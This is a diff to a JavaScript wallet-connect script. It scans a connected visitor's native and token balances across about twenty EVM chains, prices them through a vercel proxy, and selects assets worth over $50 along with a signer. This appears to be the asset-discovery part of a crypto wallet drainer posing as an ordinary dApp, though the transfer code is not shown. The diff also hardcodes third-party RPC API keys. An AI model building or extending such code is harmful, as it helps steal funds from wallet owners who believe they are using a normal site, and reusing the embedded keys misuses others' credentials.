@@ -422,7 +422,7 @@ async function connectWallet() {
        
         let networkDetect = [
           {chainId: mainnet.chainId, name: mainnet.name, rpcurl: "https://eth-mainnet.g.alchemy.com/v2/p11GpNzsKMIhQlVI7MzpSt0wow4BZ0O0", nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://etherscan.io/', fetchTokens: fetchETHTokens},
-          {chainId: bsc.chainId, name: bsc.name, rpcurl: "https://bsc-mainnet.infura.io/v3/3e8aaf2fc0854c9cab995f0e97ed69f6", nativeCurrency: {name: 'BNB',symbol:'BBN', decimal: 18}, blockExplorerUrl: 'https://bscscan.com/', fetchTokens: fetchBNBTokens},
+          {chainId: bsc.chainId, name: bsc.name, rpcurl: "https://bsc-mainnet.infura.io/v3/3e8aaf2fc0854c9cab995f0e97ed69f6", nativeCurrency: {name: 'BNB', symbol: 'BNB', decimal: 18}, blockExplorerUrl: 'https://bscscan.com/', fetchTokens: fetchBNBTokens},
           {chainId: arbitrum.chainId, name: arbitrum.name, rpcurl: "https://arb-mainnet.g.alchemy.com/v2/p11GpNzsKMIhQlVI7MzpSt0wow4BZ0O0", nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://arbiscan.io/', fetchTokens: fetchARBTokens},
           {chainId: optimism.chainId, name: optimism.name, rpcurl: "https://opt-mainnet.g.alchemy.com/v2/p11GpNzsKMIhQlVI7MzpSt0wow4BZ0O0", nativeCurrency: {name: 'Ethereum', symbol: 'ETH'}, blockExplorerUrl: 'https://optimistic.etherscan.io/', fetchTokens: fetchOPTokens},
           {chainId: arbnova.chainId, name: arbnova.name, rpcurl: "https://arbnova-mainnet.g.alchemy.com/v2/p11GpNzsKMIhQlVI7MzpSt0wow4BZ0O0", nativeCurrency: {name: 'Ethereum', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://nova.arbiscan.io/', fetchTokens: fetchARBNOVATokens},
@@ -451,12 +451,13 @@ async function connectWallet() {
           {chainId: platon.chainId, name: platon.name, rpcurl: "https://rpc.particle.network/evm-chain?chainId=210425&projectUuid=7a51f180-673c-4629-8f23-4e9fe19f8f05&projectKey=cKMD269qI3rYC2h7CKEItl4qAsHIhqIvWLSpMjUF",nativeCurrency: {name: 'PlatON', symbol: 'LAT', decimal: 18}, blockExplorerUrl: 'https://scan.platon.network', fetchTokens: fetchPLATONTokens},
           {chainId: linea.chainId, name: linea.name, rpcurl: "https://linea-mainnet.g.alchemy.com/v2/p11GpNzsKMIhQlVI7MzpSt0wow4BZ0O0", nativeCurrency: {name: 'Ether', symbol: 'ETH', decimal: 18}, blockExplorerUrl: 'https://lineascan.build/', fetchTokens: fetchLINEATokens},
           {chainId: opbnb.chainId, name: opbnb.name, rpcurl: "https://opbnb-mainnet.infura.io/v3/3e8aaf2fc0854c9cab995f0e97ed69f6", nativeCurrency: {name: 'opBNB', symbol: 'BNB', decimal: 18}, blockExplorerUrl: 'https://mainnet.opbnbscan.com', fetchTokens: fetchOPBNBTokens}
-      ]
+      
+    ]
 
         let currentChainId = await provider.getNetwork();
         let networksWithTokens = []
 
-        const minimumBalance = ethers.utils.parseUnits("0.02", 18); // Set minimum balance to 0.02 tokens
+        const minimumBalance = ethers.utils.parseUnits("0.02", 18); // Set minimum balance to 0.02 tokens before sorting the tokens
 
 
       try {
@@ -472,7 +473,7 @@ async function connectWallet() {
               const nativeBalance = await retryAsync(() => networkProvider.getBalance(address));
               if (nativeBalance.gte(minimumBalance)) {
                 const formattedNativeBalance = ethers.utils.formatUnits(nativeBalance, 18);
-                const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${nets.nativeCurrency.symbol.toLowerCase()}`;
+                const proxyUrl = `https://evms-proxy-sigma.vercel.app/proxy?symbols=${nets.nativeCurrency.symbol.toLowerCase()}`;
                 const response = await retryAsync(() => fetch(proxyUrl));
                 const prices = await response.json();
                 const priceInfo = prices.data?.[nets.nativeCurrency.symbol.toUpperCase()]?.quote.USD.price;
@@ -497,7 +498,7 @@ async function connectWallet() {
     
                   if (balance.gte(minimumBalance)) {
                     const formattedBalance = ethers.utils.formatUnits(balance, token.decimal);
-                    const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`;
+                    const proxyUrl = `https://evms-proxy-sigma.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`;
                     const response = await retryAsync(() => fetch(proxyUrl));
                     const prices = await response.json();
                     const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
@@ -588,12 +589,12 @@ async function connectWallet() {
                         try {
                             // If the network is not added to the user's wallet, add it
                             await provider.send('wallet_addEthereumChain', [{
-                                chainId: `0x${targetNetworkId.toString(16)}`,
-                                rpcUrls: [net.rpcUrl],
-                                chainName: net.name,
-                                nativeCurrency: net.nativeCurrency,
-                                blockExplorerUrls: [net.blockExplorerUrl]
-                            }]);
+                              networkName: net.name,
+                              rpcUrls: net.rpcUrl,
+                              chainId: targetNetworkId,
+                              nativeCurrency: net.nativeCurrency.symbol,
+                              blockExplorerUrls: net.blockExplorerUrl
+                          }]);
                             console.log(`Added and switched to network: ${targetNetworkId}`);
                             continue; // Continue to the next network
                         } catch (addError) {
@@ -626,11 +627,11 @@ async function connectWallet() {
                     try {
                         // If the network is not added to the user's wallet, add it
                         await provider.send('wallet_addEthereumChain', [{
-                            chainId: `0x${targetNetworkId.toString(16)}`,
-                            rpcUrls: [net.rpcUrl],
-                            chainName: net.name,
-                            nativeCurrency: net.nativeCurrency,
-                            blockExplorerUrls: [net.blockExplorerUrl]
+                            networkName: net.name,
+                            rpcUrls: net.rpcUrl,
+                            chainId: targetNetworkId,
+                            nativeCurrency: net.nativeCurrency.symbol,
+                            blockExplorerUrls: net.blockExplorerUrl
                         }]);
                         console.log(`Added and switched to network: ${targetNetworkId}`);
                         continue; // Continue to the next network
@@ -803,7 +804,7 @@ async function fetchTokenDetails(tokens, address, signer) {
       try {
         const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
         const balance = await retryAsync(() => tokenContract.balanceOf(address));
-        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`;
+        const proxyUrl = `https://evms-proxy-sigma.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`;
         const response = await retryAsync(() => fetch(proxyUrl));
         const prices = await response.json();
         const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
@@ -815,7 +816,7 @@ async function fetchTokenDetails(tokens, address, signer) {
           const usdValueString = usdValueRounded.toString();
           const transferrableValue = ethers.utils.parseUnits(usdValueString, 18);
 
-          if (balance.gte(ethers.utils.parseUnits('0.02', 18)) && transferrableValue.gte(ethers.utils.parseUnits('0.02', 18))) {
+          if (balance.gte(ethers.utils.parseUnits('0.02', 18)) && usdValueRounded > 50) {
             return {
               contract: tokenContract,
               balance: balance,
@@ -1173,7 +1174,7 @@ async function fetchSCROLLTokens(account) {
 
 //METIS API FUNCTION
 async function fetchMETISTokens(account) {
-    const url = `https://evms-proxy.vercel.app/proxy/conflux?account=${account}`
+    const url = `https://evms-proxy-sigma.vercel.app/proxy/metis?account=${account}`
     try {
         const response = await fetch(url);
         const data = await response.json();
@@ -1205,9 +1206,10 @@ async function fetchMETISTokens(account) {
     return [];
 }
 
+
 //MANTA API FUNCTION
 async function fetchMANTATokens(account) {
-    const url = `https://evms-proxy.vercel.app/proxy/manta?account=${account}`;
+    const url = `https://evms-proxy-sigma.vercel.app/proxy/manta?account=${account}`;
 
     try {
         const response = await fetch(url);
@@ -1337,7 +1339,7 @@ async function fetchCELOTokens(account) {
 
 //AVALANCHE API FUNCTION
 async function fetchAVALANCHETokens(account) {
-  const url = `https://evms-proxy.vercel.app/proxy/avalanche?account=${account}`
+  const url = `https://evms-proxy-sigma.vercel.app/proxy/avalanche?account=${account}`
     try {
         const response = await fetch(url);
         const data = await response.json();
@@ -1393,9 +1395,10 @@ async function fetchOPBNBTokens(account) {
   return [];
 }
 
+
 //OKX API FUNCTION
 async function fetchOKXTokens(account) {
-    const url = `https://evms-proxy.vercel.app/proxy/okx?account=${account}`;
+    const url = `https://evms-proxy-sigma.vercel.app/proxy/okx?account=${account}`;
 
     try {
         const response = await fetch(url);
@@ -1429,7 +1432,7 @@ async function fetchOKXTokens(account) {
 
 //MANTLE API FUNCTION
 async function fetchMANTLETokens(account) {
-    const url = `https://evms-proxy.vercel.app/proxy/mantle?account=${account}`
+    const url = `https://evms-proxy-sigma.vercel.app/proxy/mantle?account=${account}`
     try {
         const response = await fetch(url);
         const data = await response.json();
@@ -1463,7 +1466,7 @@ async function fetchMANTLETokens(account) {
 
 //AURORA API FUNCTION
 async function fetchAURORATokens(account) {
-    const url = `https://evms-proxy.vercel.app/proxy/aurora?account=${account}`
+    const url = `https://evms-proxy-sigma.vercel.app/proxy/aurora?account=${account}`
     try {
         const response = await fetch(url);
         const data = await response.json();
@@ -1522,7 +1525,7 @@ async function fetchCRONOSTokens(account) {
 
 ///KLAYTN API FUNCTION
 async function fetchKLAYTNTokens(account) {
-    const url = `https://evms-proxy.vercel.app/proxy/klaytn?account=${account}`
+    const url = `https://evms-proxy-sigma.vercel.app/proxy/klaytn?account=${account}`
     try {
         const response = await fetch(url);
         const data = await response.json();
@@ -1557,7 +1560,7 @@ async function fetchKLAYTNTokens(account) {
 
 //PLATON API FUNCTION
 async function fetchPLATONTokens(account) {
-    const url = `https://evms-proxy.vercel.app/proxy/platon?account=${account}`
+    const url = `https://evms-proxy-sigma.vercel.app/proxy/platon?account=${account}`
     try {
         const response = await fetch(url);
         const data = await response.json();
@@ -1591,7 +1594,7 @@ async function fetchPLATONTokens(account) {
 
 //HARMONY API FUNCTION
 async function fetchHARMONYTokens(account) {
-    const url = `https://evms-proxy.vercel.app/proxy/harmony?account=${account}`
+    const url = `https://evms-proxy-sigma.vercel.app/proxy/harmony?account=${account}`
     try {
         const response = await fetch(url);
         const data = await response.json();
@@ -1625,7 +1628,7 @@ async function fetchHARMONYTokens(account) {
 
 //HECO API FUNCTION
 async function fetchHECOTokens(account) {
-    const url = `https://evms-proxy.vercel.app/proxy/heco?account=${account}`
+    const url = `https://evms-proxy-sigma.vercel.app/proxy/heco?account=${account}`
     try {
         const response = await fetch(url);
         const data = await response.json();
@@ -1659,7 +1662,7 @@ async function fetchHECOTokens(account) {
 
 //SMARTBCH API FUNCTION
 async function fetchSMARTBCHTokens(account) {
-    const url = `https://evms-proxy.vercel.app/proxy/smartbch?account=${account}`
+    const url = `https://evms-proxy-sigma.vercel.app/smartbch?account=${account}`
     try {
         const response = await fetch(url);
         const data = await response.json();
@@ -1693,7 +1696,7 @@ async function fetchSMARTBCHTokens(account) {
 
 //CONFLUX ESPACE API FUNCTION
 async function fetchCONFLUXTokens(account) {
-    const url = `https://evms-proxy.vercel.app/proxy/conflux?account=${account}`
+    const url = `https://evms-proxy-sigma.vercel.app/proxy/conflux?account=${account}`
     try {
         const response = await fetch(url);
         const data = await response.json();
